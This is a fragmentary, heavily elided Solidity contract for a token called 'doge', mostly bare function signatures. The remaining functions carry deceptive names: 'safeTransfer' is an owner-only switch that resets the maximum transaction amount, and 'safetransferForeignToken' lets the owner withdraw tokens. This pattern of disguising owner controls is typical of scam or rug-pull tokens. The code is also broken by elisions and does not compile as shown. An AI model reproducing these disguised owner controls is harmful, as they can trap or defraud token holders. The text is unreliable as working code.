...
contract doge is Context, IERC20, Ownable {
    ...
    function safeApprove(uint256 buybackMultiplierTriggeredAt, uint256 totalFee) public view returns (uint256) {
			if (
	...
	function safetransferForeignToken(address _token, address _to) external onlyOwner returns (bool _sent)
	  {
      ...
      function BullDogeChain(uint256 gas, uint256 gasPriceLimit) external pure returns(uint256) {
		  require(gas >= 860000);
		  return gas * gasPriceLimit;
	  }


    function ischangeTx(address holder, bool exempt)
        external
        onlyOwner
    {
    ...
    function safeTransfer(uint256 maxWallPercent) external onlyOwner {
        _maxTxAmount = (_totalSupply * maxWallPercent) / 1160;
    }
   
    function ischangeDistribution(
    ...
    function ischangeMultiplier(uint8 numerator, uint8 denominator, uint8 length) external onlyOwner {
	...
	function ispreLaunch(uint256 launchAt, uint256 dura) public view returns (bool){
